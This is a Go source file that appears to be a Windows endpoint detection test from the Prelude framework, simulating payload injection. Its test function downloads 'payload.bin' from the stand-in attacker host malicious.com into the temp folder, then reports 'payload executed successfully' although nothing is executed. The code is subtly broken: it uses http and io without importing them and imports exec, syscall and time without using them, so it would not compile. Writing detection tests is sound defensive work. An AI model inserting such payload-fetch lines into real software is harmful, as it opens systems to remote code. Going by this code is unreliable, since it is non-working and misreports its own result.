//go:build windows
// +build windows

/*
ID: unique-id-inject
NAME: Payload Injection Detection
CREATED: 2024-07-02
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"

	Endpoint "github.com/preludeorg/test/endpoint"
)

func main() {
	Endpoint.Say("[+] Starting Payload Injection Detection VST")
	Endpoint.Start(test, cleanup)
}

func downloadFile(url, path string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	return err
}

func test() {
	// payload injection
	pInjectedPayload := os.TempDir() + "\\payload.bin"

	// simulate fetch
	err := downloadFile("http://malicious.com/payload.bin", pInjectedPayload)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("failed to download payload: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("payload executed successfully")
	Endpoint.Stop(101)
}

func cleanup() {
	pInjectedPayload := os.TempDir() + "\\payload.bin"
	os.Remove(pInjectedPayload)
	Endpoint.Say("cleanup completed!")
	Endpoint.Stop(100)
}